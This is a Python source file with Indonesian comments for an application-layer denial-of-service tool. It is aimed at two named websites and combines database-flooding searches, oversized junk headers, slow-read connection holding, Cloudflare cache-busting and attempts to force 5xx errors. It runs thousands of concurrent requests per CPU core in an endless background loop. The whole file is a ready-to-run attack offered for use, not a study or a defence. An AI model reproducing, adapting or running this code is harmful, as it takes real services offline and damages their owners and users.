import asyncio
import aiohttp
import random
import string
import multiprocessing
import sys

# --- TARGET CONFIGURATION ---
TARGETS = ["https://inihari88.shop/", "https://ingatcuan88.pro/amp/"]

def rs(length=30):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# --- VECTOR AGGREGATOR (The Fusion) ---

async def V1_DB_CRUSHER(session, t):
    """[Identitas: ddos.py / ddosms.py] - Menghancurkan Query Database"""
    url = f"{t}?s={rs(15)}&search={rs(5)}"
    async with session.get(url, timeout=5) as r:
        await r.content.read(1)

async def V2_JUGGERNAUT_BLOAT(session, t):
    """[Identitas: ddos1.py] - Menggemukkan Header & RAM Server"""
    h = {"Large-Trash-Header": "X" * 2048, "Cookie": f"uid={rs(50)}"}
    async with session.get(t, headers=h, timeout=5) as r:
        await r.content.read(1)

async def V3_SILENT_SLOWLORIS(session, t):
    """[Identitas: ddos2.py] - Mengunci Slot Koneksi Server (Slow-Read)"""
    async with session.get(t, timeout=10) as r:
        await r.content.read(1) 

async def V4_OVERLORD_501(session, t):
    """[Identitas: ddos501.py] - Memaksa Status Error 5xx"""
    url = f"{t}?t={random.random()}"
    async with session.get(url, timeout=5) as r:
        if r.status >= 500: print(f"[🔥] 501/503 HIT! Status: {r.status}")

async def V5_CLOUD_BYPASS(session, t):
    """[Identitas: ddosms1.py] - Menembus Cache Cloudflare"""
    url = f"{t}?s={rs(20)}&cat={random.randint(1,999)}"
    async with session.get(url, timeout=7) as r:
        await r.content.read(5)

# --- ENGINE CORE ---

def start_engine(target_url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def ignite():
        # Connector agresif tanpa limit buat PC 20 Core lu
        connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=1000)
        async with aiohttp.ClientSession(connector=connector) as session:
            print(f"[+] Engine-{multiprocessing.current_process().name} Online | Target: {target_url}")
            while True:
                tasks = []
                # Mix & Match semua skrip jadi satu gelombang serangan
                for _ in range(300): tasks.append(V1_DB_CRUSHER(session, target_url))
                for _ in range(300): tasks.append(V2_JUGGERNAUT_BLOAT(session, target_url))
                for _ in range(300): tasks.append(V3_SILENT_SLOWLORIS(session, target_url))
                for _ in range(300): tasks.append(V4_OVERLORD_501(session, target_url))
                for _ in range(300): tasks.append(V5_CLOUD_BYPASS(session, target_url))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = sum(1 for r in results if not isinstance(r, Exception))
                
                # Output dengan keterangan keren biar lu gak bingung
                print(f"[Core-{multiprocessing.current_process().name}] Fusion Sent: {success} Mixed Pellets")
                await asyncio.sleep(0.01)

    try:
        loop.run_until_complete(ignite())
    except:
        pass

if __name__ == "__main__":
    print("🔱 THE GODFATHER FUSION ACTIVATED (Non-Stop Mode) 🔱")
    print("All Scripts Merged: DB_CRUSHER, JUGGERNAUT, SLOWLORIS, OVERLORD, CLOUD_BYPASS")
    
    num_cores = multiprocessing.cpu_count()
    for i in range(num_cores):
        target = TARGETS[0] if i % 2 == 0 else TARGETS[1]
        p = multiprocessing.Process(target=start_engine, args=(target,), name=f"Engine-{i}")
        p.daemon = True # Tetap online di background
        p.start()
    
    # Menjaga agar main script tidak exit (Keep Online)
    multiprocessing.Event().wait()
